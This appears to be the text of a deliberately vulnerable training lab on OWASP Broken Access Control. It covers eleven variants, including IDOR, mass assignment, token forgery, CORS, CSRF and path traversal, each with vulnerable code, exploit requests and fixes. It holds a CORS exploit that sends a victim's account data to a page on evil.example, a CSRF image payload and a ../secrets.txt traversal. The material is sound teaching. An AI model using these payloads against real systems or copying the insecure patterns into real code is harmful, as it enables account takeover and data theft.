Variant 7 — Forced Browsing to an Unprotected Admin Resource

CWE-425 · GET /a01/admin-panel.html

A real-looking admin panel page exists at a guessable URL, with zero server-side session/role check — it's not linked from this UI, but nothing stops you from opening it directly, logged in or not.

Fix: enforce authentication + role checks server-side on every route/resource, regardless of whether a link to it is shown in the UI.

Variant 3 — Mass Assignment / Parameter Tampering (Privilege Escalation via Payload)

CWE-915 · PUT /api/a01/users/:id/profile

Log in as alice (id 1) and "edit your profile" — but slip role and tenantId into the payload. The server merges the whole body onto the record with no field allow-list.

—
Fix: whitelist updatable fields explicitly (e.g. { bio, email }); never Object.assign()/spread a raw request body onto a DB record.

Variant 4 — HTTP Verb / Method Tampering

CWE-650 · GET vs DELETE /api/a01/admin/orders/:id

Log in as alice (non-admin). GET on this path correctly returns 403. Send DELETE to the exact same path instead — the admin check was only applied to the GET handler.

—
Fix: apply authorization middleware per-route for every verb on a path, or centrally via a route-table that maps verb+path to required roles.

Variant 8 — Client-Side-Only Access Control

CWE-602 · DELETE /api/a01/orders/:id/force

The "Force delete" button below is only rendered when the UI thinks you're an admin (decoded from your own token, client-side). Log in as alice and it's hidden — but the raw API call underneath it has zero server-side check.

—
Fix: never rely on hiding a button as the authorization mechanism — enforce the same check server-side on the endpoint itself.

Variant 5 — Multi-Tenant Data Leakage (Tenant Isolation Bypass)

CWE-668 · GET /api/a01/tenants/:tenantId/orders

Log in as bob (Globex Inc, tenantId 2) and request tenantId 1 (Acme Corp) in the URL — Acme's orders come back anyway.

—
Fix: always derive the tenant scope from the authenticated session (req.user.tenantId), never trust a tenant id supplied in the URL/body.

Variant 6 — JWT / Token Tampering (Trusting an Unsigned Client-Supplied Claim)

CWE-347 · GET /api/a01/whoami

The token from login is just base64(JSON) — no signature. Edit the decoded JSON below (e.g. set "role":"admin" or change "tenantId"), re-encode, and the server accepts it for every route above.

—
Fix: use a properly signed & verified token (e.g. JWT with HMAC/RSA signature checked server-side and algorithm allow-listing), or server-side sessions.

Variant 9 — CORS Misconfiguration (Overly Permissive Cross-Origin Access)

CWE-942 · GET /api/a01/account

The server runs cors({ origin: true, credentials: true }) — it reflects back any Origin and allows credentials. Any other website could read this response using your cookie. Try it here, then check the response headers in devtools (Access-Control-Allow-Origin / -Credentials).

—
Fix: set an explicit allow-list of trusted origins; never combine origin: true (reflect-any-origin) with credentials: true.

Variant 10 — Cross-Site Request Forgery (CSRF)

CWE-352 · GET /api/a01/transfer?to=&amount=

Log in as alice, then open the simulated malicious page below in a new tab. It silently fires a request that moves alice's credits to mallory, using nothing but her session cookie — no CSRF token, no confirmation.

—
Fix: require an anti-CSRF token on state-changing requests, set the session cookie's SameSite attribute appropriately, verify Origin/Referer, and never perform state changes via GET.

Variant 11 — Path Traversal Bypassing Access Restriction on Files

CWE-22 / CWE-23 (mapped under A01:2025) · GET /api/a01/files

Meant to serve only your own tenant's invoice. Try tenant=tenant-2 to read the other tenant's file, or name=../secrets.txt to escape the tenant folder and reach an app-wide secret.

—

Try: name=../secrets.txt (escapes private/tenant-1/ into private/secrets.txt), or tenant=tenant-2 while logged in as an Acme Corp user.

Fix: resolve the final path and verify it stays within an allow-listed base directory (e.g. path.resolve + startsWith check), and enforce tenant === req.user.tenantId.

1. Core Concept: Authentication vs. Authorization

To understand Broken Access Control, separate Authentication (AuthN) from Authorization (AuthZ):

PropertyAuthentication (AuthN)Authorization (AuthZ)
Question"Who are you?""What are you allowed to do?"
MechanismPasswords, MFA, SSO, biometricsRoles (RBAC), policies, ownership rules (ABAC)
HTTP status401 Unauthorized (really means Unauthenticated)403 Forbidden (authenticated, but lacking rights)
OWASP categoryA07: Identification and Authentication FailuresA01: Broken Access Control

The flaw: Broken Access Control happens when the app verifies your identity (AuthN succeeds) but fails to enforce boundaries on what that identity can view, create, update, or delete (AuthZ fails).

2. The Variants of Broken Access Control

This lab implements 11 variants on the screen above — the 5 classic ones below, plus 6 more (JWT tampering, forced browsing, client-side-only checks, CORS misconfiguration, CSRF, and path traversal) that OWASP's official CWE mapping and real-world incidents also attribute to A01. Expand each for the mechanism, vulnerable code, and attack scenario:

Variant 1 — IDOR / Horizontal Privilege Escalation CWE-639

Mechanism: the server exposes an internal database primary key or file path directly in the request (URL, query string, or body) and queries it without checking if the current user owns that record.

Impact: a standard user accesses another standard user's data at the same privilege level.

Express / Node.js — vulnerable
// VULNERABLE: Direct reference to :id without ownership check
app.get('/api/user/documents/:id', authenticateToken, async (req, res) => {
    // req.user.id is populated by authenticateToken, but NEVER checked!
    const document = await db.query('SELECT * FROM documents WHERE id = $1', [req.params.id]);

    if (!document.rows[0]) {
        return res.status(404).json({ error: "Not found" });
    }
    return res.json(document.rows[0]);
});

Attack scenario: Bob logs in (req.user.id = 12) and views his own document at GET /api/user/documents/501. He edits the URL to GET /api/user/documents/502 in DevTools/Burp — the server runs the same query with id=502 and returns Alice's document directly.

Variant 2 — Vertical Privilege Escalation (Missing Function-Level Access Control) CWE-862

Mechanism: the app relies on hiding UI buttons or client-side role checks, while the administrative API endpoint itself lacks server-side role validation.

Impact: a low-privileged user performs high-privileged admin actions (deleting accounts, changing billing tiers, banning users).

Python / Flask — vulnerable
# VULNERABLE: Only checks if user is logged in, not if they are an admin
@app.route("/api/admin/users/<int:target_user_id>/ban", methods=["POST"])
@jwt_required()
def ban_user(target_user_id):
    # Missing: if not current_user.is_admin: abort(403)
    user = User.query.get_or_404(target_user_id)
    user.is_banned = True
    db.session.commit()
    return jsonify({"message": f"User {target_user_id} banned successfully."})

Attack scenario: an attacker registers a free-tier account, inspects the frontend JS bundle, and discovers an undocumented endpoint /api/admin/users/{id}/ban. They call it with their normal user token — the server accepts it because it only verified the token was valid, never that user.role == 'ADMIN'.

Variant 3 — Mass Assignment / Parameter Tampering (Privilege Escalation via Payload) CWE-915

Mechanism: the app blindly maps JSON request bodies onto internal database models without filtering permitted fields.

Impact: an attacker injects administrative fields (role, is_admin, credits) into a normal profile-update request.

Python / FastAPI + Pydantic — vulnerable
# VULNERABLE: schema allows arbitrary internal fields to be set by the client
class UserProfileUpdate(BaseModel):
    name: str
    email: str
    role: Optional[str] = None         # DANGEROUS!
    is_verified: Optional[bool] = None # DANGEROUS!

@app.patch("/api/profile")
def update_profile(data: UserProfileUpdate, current_user: User = Depends(get_current_user)):
    for key, value in data.dict(exclude_unset=True).items():
        setattr(current_user, key, value)
    db.commit()
    return {"status": "updated"}
HTTP request — exploit
PATCH /api/profile HTTP/1.1
Host: example.com
Authorization: Bearer <attacker_token>
Content-Type: application/json

{
    "name": "Attacker",
    "email": "attacker@evil.com",
    "role": "SUPERADMIN",
    "is_verified": true
}

Attack scenario: the "Update Profile" form only intends to change name/email, but the attacker adds role and is_verified. The model updates current_user.role = 'SUPERADMIN' — on the next request, the attacker has full admin control.

Variant 4 — HTTP Verb / Method Tampering CWE-650

Mechanism: access rules are configured per HTTP method, but the security middleware doesn't account for alternate verbs or routing edge cases.

Impact: bypassing authorization filters by switching the request method (e.g. using POST/PUT/DELETE where only GET was protected).

Spring Security / Java — vulnerable
// VULNERABLE: Only protects GET requests on the admin path
http.authorizeRequests()
    .antMatchers(HttpMethod.GET, "/admin/**").hasRole("ADMIN")
    .antMatchers("/**").permitAll();

Attack scenario: an attacker sends POST /admin/users or PUT /admin/users. Because the constraint only matched HttpMethod.GET, the request instead matches .permitAll() and reaches the controller unauthenticated/unauthorized.

Variant 5 — Multi-Tenant Data Leakage (Tenant Isolation Bypass) CWE-668

Mechanism: in SaaS platforms sharing one database across customers, a query is written without scoping by tenant_id/organization_id.

Impact: Company A gains full visibility into Company B's proprietary data — a severe regulatory/compliance failure.

SQL — vulnerable
-- VULNERABLE: searches across the entire table without filtering by tenant
SELECT * FROM invoices WHERE invoice_number = 'INV-2026-001';

Attack scenario: a Globex Inc user requests an Acme Corp invoice number (guessed, leaked, or sequential) and receives it, because the query never added AND tenant_id = :current_tenant_id.

Variant 6 — JWT / Token Tampering (Trusting an Unsigned Client-Supplied Claim) CWE-347

Mechanism: the "auth token" issued at login is just base64(JSON.stringify(payload)) — there is no HMAC/RSA signature, no alg verification, nothing. The server decodes it and trusts every field (id, role, tenantId) exactly as given.

Impact: anyone holding a token — even a normal user's — can forge a different identity, role, or tenant entirely offline, with no cryptographic secret required.

Node.js — utils/auth.js (vulnerable, this app)
function issueToken(payload) {
  return Buffer.from(JSON.stringify(payload)).toString('base64');
}
function decodeToken(token) {
  return JSON.parse(Buffer.from(token, 'base64').toString('utf8'));
}
// No signature is ever generated or verified — decodeToken() just
// trusts whatever JSON comes back out of the base64 string.
function fakeAuth(req, res, next) {
  const header = req.headers.authorization || '';
  const token = header.startsWith('Bearer ') ? header.slice(7) : null;
  req.user = token ? decodeToken(token) : null; // fully attacker-controlled
  next();
}

Attack scenario: alice logs in and gets a token. She runs atob(token) in the browser console, sees {"id":1,"username":"alice","role":"user","tenantId":1}, changes "role" to "admin", runs btoa(JSON.stringify(edited)), and sends that as her new Bearer token. Every admin-gated route now treats her as an administrator.

Variant 7 — Forced Browsing to an Unprotected Admin Resource CWE-425

Mechanism: a fully functional admin page (and the API it calls) exists at a predictable/guessable URL. It is never linked from the app's navigation, so the developer assumed nobody would find it — but neither the page nor its API perform any session or role check.

Impact: anyone who guesses, brute-forces, or stumbles on the URL (e.g. via a leaked link, sitemap, JS bundle reference, or wordlist scan) gets full admin functionality with zero authentication.

Node.js — routes/a01.js (vulnerable, this app)
// Reachable at GET /a01/admin-panel.html via express.static() —
// no auth middleware in front of the static file at all.

router.get('/admin/stats', (req, res) => {
  // Vulnerable: no fakeAuth, no requireAdmin — completely unauthenticated.
  res.json({
    totalUsers: store.users.length,
    totalOrders: store.orders.length,
    totalRevenue: store.orders.reduce((sum, o) => sum + o.amount, 0),
    allUsernamesAndRoles: store.users.map((u) => ({ username: u.username, role: u.role })),
  });
});

Attack scenario: an attacker runs a wordlist scan (ffuf/gobuster) against the app, or simply reads the shipped JS bundle and notices a reference to /admin-panel.html. They open it directly, logged out, and see live revenue and user data — "security through obscurity" was the only thing protecting it.

Variant 8 — Client-Side-Only Access Control CWE-602

Mechanism: the frontend decodes the user's own token and hides a sensitive "admin" button/action if the role isn't admin — but the backend endpoint behind that button performs no authorization check (often none at all) of its own.

Impact: the restriction is purely cosmetic. Anyone who bypasses the UI — curl, Postman, a browser devtools fetch — can call the action regardless of role, or even without logging in.

JS (frontend) + Node.js (backend) — vulnerable, this app
// Frontend (public/a01/a01.js) — enforcement lives ONLY here:
forceBtn.style.display = decoded.role === 'admin' ? 'inline-block' : 'none';

// Backend (routes/a01.js) — no matching check exists server-side:
router.delete('/orders/:id/force', (req, res) => {
  // Vulnerable: no fakeAuth, no requireAdmin, no check of any kind.
  const deleted = store.deleteOrder(req.params.id);
  res.json({ deleted });
});

Attack scenario: logged in as alice (a plain user), the "Force delete" button never renders. The attacker opens devtools, finds DELETE /api/a01/orders/3/force referenced in the JS, and calls it directly with fetch() or curl — the order is deleted with no role check ever executed.

Variant 9 — CORS Misconfiguration (Overly Permissive Cross-Origin Access) CWE-942

Mechanism: the server enables CORS with origin: true (reflects back whatever Origin header the caller sends as if it were allow-listed) combined with credentials: true — the one combination CORS specifically warns against, because it lets any website read authenticated responses using the victim's cookies.

Impact: a completely unrelated, attacker-controlled website can silently query the app's API on behalf of a logged-in visitor and read the response, without the victim ever knowing.

Node.js — server.js (vulnerable, this app)
// VULN: CWE-942 — reflects any Origin AND allows credentials.
app.use(cors({ origin: true, credentials: true }));
Attacker's page — exploit
// Hosted on evil.example, loaded while the victim is logged into the lab
fetch('http://localhost:3000/api/a01/account', { credentials: 'include' })
  .then(r => r.json())
  .then(data => sendToAttackerServer(data)); // steals email, credits, tenant, etc.

Attack scenario: alice is logged into the lab in one tab. She visits evil.example in another. Its script fetches /api/a01/account with credentials:'include' — the browser attaches alice's cookie, the server reflects evil.example back as an allowed origin, and the attacker's page reads alice's account data directly.

Variant 10 — Cross-Site Request Forgery (CSRF) CWE-352

Mechanism: a state-changing action (transferring "credits") is wired up on GET instead of POST, relies solely on a session cookie with no SameSite restriction, and requires no anti-CSRF token or Origin/Referer check.

Impact: any third-party page can trigger the action on a logged-in victim's behalf just by getting their browser to load a URL — an <img> tag is enough, no JavaScript or click required.

Node.js — routes/a01.js (vulnerable, this app)
// No CSRF token check, no re-authentication, and it's a GET:
router.get('/transfer', fakeAuth, (req, res) => {
  const { to, amount } = req.query;
  sender.credits -= amt;
  recipient.credits += amt;
  res.json({ transferred: amt, from: sender.username, to: recipient.username });
});
Malicious page — exploit (public/a01/csrf-poc.html)
<img src="http://localhost:3000/api/a01/transfer?to=mallory&amount=50">
<!-- Browser auto-attaches the victim's a01_session cookie to this GET -->

Attack scenario: alice logs into the lab (cookie is set). She opens an unrelated-looking page in another tab; its hidden <img> tag fires a GET to the transfer endpoint. Her browser automatically attaches her session cookie, and 50 of her credits move to "mallory" with no prompt, click, or confirmation.

Variant 11 — Path Traversal Bypassing Access Restriction on Files CWE-22 / CWE-23

Mechanism: a file-serving endpoint joins user-supplied tenant/name parameters directly onto a base directory with no normalization or allow-list check, and separately never verifies the requested tenant matches the caller's own tenant.

Impact: an attacker can read another tenant's private files (broken tenant isolation) or use ../ sequences to escape the intended directory and read arbitrary files elsewhere on disk (e.g. application source, secrets).

Node.js — routes/a01.js (vulnerable, this app)
router.get('/files', fakeAuth, (req, res) => {
  const { tenant, name } = req.query;
  // Vulnerable: no allow-list on tenant/name, and no check that
  // tenant === req.user.tenantId.
  const filePath = path.join(__dirname, '..', 'private', tenant || '', name || 'invoice.txt');
  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) return res.status(404).json({ error: err.message, filePath });
    res.type('text/plain').send(data);
  });
});

Attack scenario: logged in as bob (Globex Inc), requesting ?tenant=tenant-1&name=invoice.txt returns Acme Corp's invoice directly (tenant bypass, no traversal needed). Requesting ?tenant=tenant-1&name=../secrets.txt escapes the tenant folder entirely and reads an app-wide secrets file that isn't scoped to any tenant.

3. How Attackers Exploit Broken Access Control

Reconmap endpoints, IDs, roles from the app/JS bundle
→
Enumeratesequential/guessable IDs, hidden routes
→
Testreplay requests with a lower-priv or no token
→
Automatediff responses at scale (Burp Autorize)
→
Exploitread/modify/delete data, escalate privileges

Key tooling used by attackers

  • Burp Suite — Autorize extension: captures requests made by a high-privilege session (e.g. Admin) and replays them using a low-privilege session token, and again with no token at all. If a replayed request still returns 200 OK with a matching response, it flags an instant Broken Access Control finding.
  • ID fuzzing: tools like ffuf or gobuster run against sequential/predictable IDs (?user_id=1, ?user_id=2, …) to find records that shouldn't be reachable.

4. Why Common "Fixes" Fail (False Senses of Security)

Myth 1: "We use UUIDs, so we're safe from IDOR."

UUIDs (e.g. 4a2b91f0-7b5c-4d3e-9081-0123456789ab) stop attackers from guessing sequential numbers, but obscurity is not access control. If a UUID leaks — server logs, referrer headers, chat messages, a public API, a data breach — any authenticated user can still supply it and fetch the data if server-side authorization is missing.

Myth 2: "We hide the button in the UI if the user isn't an admin."

The client (browser/mobile app) is entirely under the user's control. Attackers don't use your UI — they use proxies (Burp Suite, Postman, curl) to send HTTP requests straight to the backend API, bypassing whatever the UI hides.

Myth 3: "Our API gateway verifies the JWT, so our routes are secured."

The gateway checks whether the token's signature is valid (AuthN). It typically has no idea whether user_id: 5 in the token actually owns row id: 884 in the database. Record-level authorization must be enforced in the application or data tier, not just at the gateway.

5. Architectural Defense: How to Implement Robust Access Control

Layer 1 — Deny-by-default architecture

Configure the routing framework so every endpoint requires authorization by default. Only explicitly marked public routes (/login, /healthz) bypass the check.

Layer 2 — Model-level & query-level ownership enforcement

Never query solely by object ID — always bind lookups to the authenticated subject's context (user id, tenant id, role).

Python / SQLAlchemy — secure
# SECURE: multi-layered ownership and tenant check
@app.route("/api/invoices/<uuid:invoice_id>", methods=["GET"])
@jwt_required()
def get_invoice(invoice_id):
    current_user_id = get_jwt_identity()
    user = User.query.get(current_user_id)

    # Query binds directly to tenant and ownership criteria
    invoice = Invoice.query.filter_by(
        id=invoice_id,
        tenant_id=user.tenant_id  # Multi-tenant isolation
    ).first()

    if not invoice:
        # Return 404 rather than 403 to avoid confirming the object exists
        return jsonify({"error": "Invoice not found"}), 404

    # Enforce object-level access control (ABAC/RBAC)
    if not user.has_permission_for(invoice):
        return jsonify({"error": "Access forbidden"}), 403

    return jsonify(invoice.serialize()), 200

Layer 3 — Attribute-Based Access Control (ABAC) & policy-as-code

For complex platforms, hardcoded if user.role == 'ADMIN' checks scattered through the codebase quickly become unmaintainable and introduce gaps. Use ABAC or policy-as-code engines such as Open Policy Agent (OPA) or Casbin.

Open Policy Agent — Rego policy
package app.authz

# Default to deny all traffic
default allow = false

# Rule 1: Admins can do anything
allow {
    input.user.role == "admin"
}

# Rule 2: Users can read/update documents only if they are the author
# and the document is not archived
allow {
    input.method in ["GET", "PUT"]
    input.user.id == input.document.author_id
    input.document.is_archived == false
}
Application code — checking the policy
decision = opa_client.check_policy(
    input={"user": current_user, "document": doc, "method": request.method}
)
if not decision.is_allowed():
    abort(403)

DesignAdopt a deny-by-default strategy. Explicitly declare which roles can access each resource.
